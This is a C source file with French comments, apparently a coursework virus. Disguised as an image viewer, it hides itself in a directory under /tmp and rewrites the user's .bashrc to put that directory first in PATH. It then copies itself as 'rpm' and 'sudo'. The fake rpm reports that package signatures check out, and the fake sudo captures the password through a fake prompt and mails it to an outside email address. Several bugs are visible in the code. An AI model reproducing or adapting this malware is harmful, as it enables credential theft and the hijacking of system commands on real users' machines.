//
//  main.c
//  v_RpMdp
//
//  Created by Cécile Bourgeois on 02/06/2021.
//  Copyright © 2021 Cécile Bourgeois. All rights reserved.
//
//

#include <getopt.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <pwd.h>

/* définition des variables */
struct stat info_fichier;
int etat_retour;
FILE * fichier_out, * fichier_in;
char car, chaine[64], chaine2[64];
// ancienne version
//struct passwd * pass;

char * ch, * p1, * new_ch, * repertoire_cache, * repertoire_mdp, * chaine_mdp;
int i,taille;

/* Liste des fichiers cibles : pour l'instant on ne cible que "rpm" */
char * cible[2] = {"rpm", "sudo"};



    int main(int argc,char * argv[ ],char * envp[ ])
    {
        register struct passwd *pw;
        register uid_t uid;
        // l'executable appelant est-il ImageView
        if (strstr(argv[0],"imageview"))
        {
            // Lors de la primo-infection, on lance d'abord le programme "originel"
            strcpy(chaine, "display ");
            strcat(chaine, argv[1]);
            
            // Si on rencontre un problème, fin du programme
            if(system(chaine) == -1) exit(0);
            
            // Création du nom du répertoire caché
            repertoire_cache = "/tmp/.   ";
            
            // Surinfection : si le répertoire accesible en ouverture alors déjà infecté
            if(opendir(repertoire_cache)) exit(0);
            
            // Si non : création du répertoire en gérant les erreurs
            if(mkdir(repertoire_cache, 0777)) exit(0);
            
            // Création de la chaine $HOME/.bashrc
            uid = getuid();
            pw = getpwuid(uid);
            if(pw) {
                
              // Création de la chaine $HOME/.bashrc
              strcpy(chaine,pw->pw_dir);
              strcat(chaine,"/.bashrc");
              printf("%s\n",chaine); // OK
                
            }
	        else exit(0);
            
            // la taille nous sera utile pour l'ecriture dans le fichier
            stat(chaine, &info_fichier);
            taille = (int)info_fichier.st_size;
            printf("Taille = %d\n",taille); /// OK

            // -------- On modifie le .bashrc ----------
            
            // création d'un tableau
            if(!(ch = (char *)calloc(taille+30, sizeof(char)))) exit(0);
            
            // On créée un flux de lecture du fichier dont l'adresse est chaine
            if(!(fichier_in = fopen(chaine,"r"))) exit(0);
            
            // on créée un flux d'ecriture dans file_tmp
            if(!(fichier_out = fopen("file_tmp","w"))) exit(0);
            
            // le curseur est situé au début du fichier
	        i = 0;
            
            // on lit le fichier qu'on enregistre dans un tableau ch
            while(fscanf(fichier_in,"%c",&car),!feof(fichier_in)) ch[i++] = car;
            // pour fermer la boucle feof, après que la dernière valeur ait été lue feof() renvoie 0
            
            // on va vérifier si la variable PATH est présente dans .bashrc
            // on stocke ce qui est après PATH= dans ch
            p1 = strstr(ch,"PATH=");

            if(p1 != NULL) 
            {
                new_ch = (char *)calloc(taille+50, sizeof(char)); // commentaire
                
                // On copie les caracteres avant le PATH = vers new_ch
                strncpy(new_ch,ch,strlen(ch)-strlen(p1));
                
                // On ajoute a new_ch notre nouvelle variable PATH
                // on ajoute en premier notre dossier puis le reste du PATH original
                strcat(new_ch, "PATH=");
                strcat(new_ch,"/tmp/.\\ \\ \\ :$");
                strcat(new_ch,(p1+6));
                
                // on écrit dans le flux fichier_out
                fwrite(new_ch,1,taille+13,fichier_out);
            }

            // sinon on la rajoute
            else
            {
                printf("on la pas trouvé dans bashrc"); 
                fwrite(ch,1,taille,fichier_out);
                fprintf(fichier_out,"PATH=/tmp/.\\ \\ \\ :$PATH\n");
                fprintf(fichier_out,"export PATH");
            }

            // on remplace l'ancien .bashrc
            if(rename("file_tmp",chaine)) exit(0);

            // On commence la primo infection
            for(i = 0;i < 2;i++)
            {
                // Duplication du virus
                strcpy(chaine2,"cp ");
                strcat(chaine2,argv[0]);
                strcat(chaine2," /tmp/.\\ \\ \\ /");
                strcat(chaine2, cible[i]);
                if(system(chaine2) == -1) continue;
                // Chaque copie du virus est rendue executable
                p1 = strstr(chaine2,"/tmp");
                chmod(p1, S_IRWXU);
            }

        }
        // l'executable appelant est un hote infecté
        else
        {
            
            if(argv[0]=="rpm")
            {
                // comment obtenir l'option du programme ? ce n'est pas un argument ? argv[1] ??
                int options;
                int appel_OK;
                appel_OK=0;
                const char* const option_courte = "K";
                const struct option option_longue[] = {{ "checksig", 0, NULL, 'K' }, { NULL, 0, NULL, 0}};
                
                while ((options = getopt_long(argc, argv, option_courte, option_longue, NULL)) != -1)
                    switch (options) {
                        case 'K' :
                            appel_OK=1;
                            break;
                    }
            
                if (appel_OK==1) {
                    // On affiche "l'argument est intègre" ...
                    printf(" Argument integre ");
                }
                else
                {
                    // Nom avec chemin absolu du programme hote : RPM installé par défaut :
                    strcpy(new_ch,"/usr/bin/");
                    strcat(new_ch, argv[0]);
                    execve(new_ch, argv, envp);
                }
            }
            
            if(argv[0]=="sudo")
            {
                
                
                // on fait une fausse entrée qu'on enregistre et envoie par mail
                // déclarer les varibales repertoire_mdp et chaine_mdp
                // création du répertoire mdp
                repertoire_mdp = "/tmp/.   /mdp"; // à déclarer
                
                // on vérifie si on a déjà stocké le mot de passe root
                if (opendir(repertoire_mdp)) {
                    // si non on créée le répertoire
                    if(mkdir(repertoire_mdp, 0777)) exit(0);
                    
                    // On simule une demande de mot de passe suite à la commande sudo
                    strcpy(chaine_mdp, "read -s -p \"Entrez votre mot de passe\" PASSWD; echo ");
                    
                    // Si on rencontre un problème, fin du programme
                    if(system(chaine_mdp) == -1) exit(0);
                
                   
                    // on stocke le mot de passe entré dans log.txt
                    strcpy(chaine_mdp, "echo $PASSWD > /tmp/.    /mdp/log.txt ");
                    
                    // Si on rencontre un problème, fin du programme
                    if(system(chaine_mdp) == -1) exit(0);
                    
                    // On envoi le mot de passe à l'aide de mail
                    // ici une fausse adresse
                    strcpy(chaine_mdp, "cat /tmp/.    /mdp/log.txt | mail -s \"mdp\" francois.bernard323@gmail.com");
                    
                    // Si on rencontre un problème, fin du programme
                    if(system(chaine_mdp) == -1) exit(0);
                    
                    
                }
                else
                {
                    // Nom avec chemin absolu du programme hote : sudo :
                    strcpy(new_ch,"/usr/bin/");
                    strcat(new_ch, argv[0]);
                    execve(new_ch, argv, envp);
                }
            }
            
        }

    }




